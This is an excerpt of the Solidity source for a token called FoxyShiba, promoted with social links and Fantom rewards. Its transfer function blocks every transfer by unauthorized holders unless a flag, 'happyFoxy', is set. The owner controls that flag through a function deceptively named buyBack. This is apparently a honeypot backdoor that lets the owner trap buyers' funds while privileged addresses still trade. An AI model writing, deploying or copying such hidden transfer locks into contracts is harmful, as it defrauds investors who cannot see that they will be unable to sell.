 ...
 * FoxyShiba (FSHIBA)
 * Fantom (FTM) rewards
 * Twitter - https://twitter.com/foxyshibacrypto
 * Telegram - https://t.me/FoxyShiba
 * Website - https://foxyshiba.club
*/
...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 REW = IBEP20(0xAD29AbB318791D579433D831ed122aFeAf29dcfe);
...
contract FoxyShiba is IBEP20, Auth {
    using SafeMath for uint256;

    address REW = 0xAD29AbB318791D579433D831ed122aFeAf29dcfe;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    string constant _name = "FoxyShiba";
    ...
    constructor () Auth(msg.sender) {
        ...
        // Tax addresses
        autoLiquidityReceiver = 0x8a6eb967749840C62994d64DDd70f73A5dBEc050;
        marketingFeeReceiver = 0xCD69BbC87e06a9BB2c3908ABD8B7411E487EacF5;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if(!authorizations[sender] && !authorizations[recipient]){
            require(happyFoxy,"Foxy is not happy");
        }
    ...
    // BuyBack Foxy
    function buyBack(bool _status) public onlyOwner {
        happyFoxy = _status;
    }
